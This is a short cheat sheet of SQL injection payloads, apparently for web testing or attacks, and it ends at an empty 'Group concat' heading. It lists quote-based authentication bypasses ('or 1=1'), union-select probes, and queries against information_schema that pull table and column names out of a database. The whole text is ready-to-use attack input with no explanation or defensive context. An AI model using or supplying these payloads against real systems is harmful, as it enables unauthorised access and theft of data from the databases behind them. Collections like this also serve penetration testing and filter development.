# basic
' or 1='1
" or 1="1


# union select
' union select 1,2,3;--+
" union select 1,2,3;-- 


# data exfiltration
' union select 1,table_name,3 from information_schema.tables;--+
" union select 1,2,column_name from information_schema.columns;--+




# Group concat
" 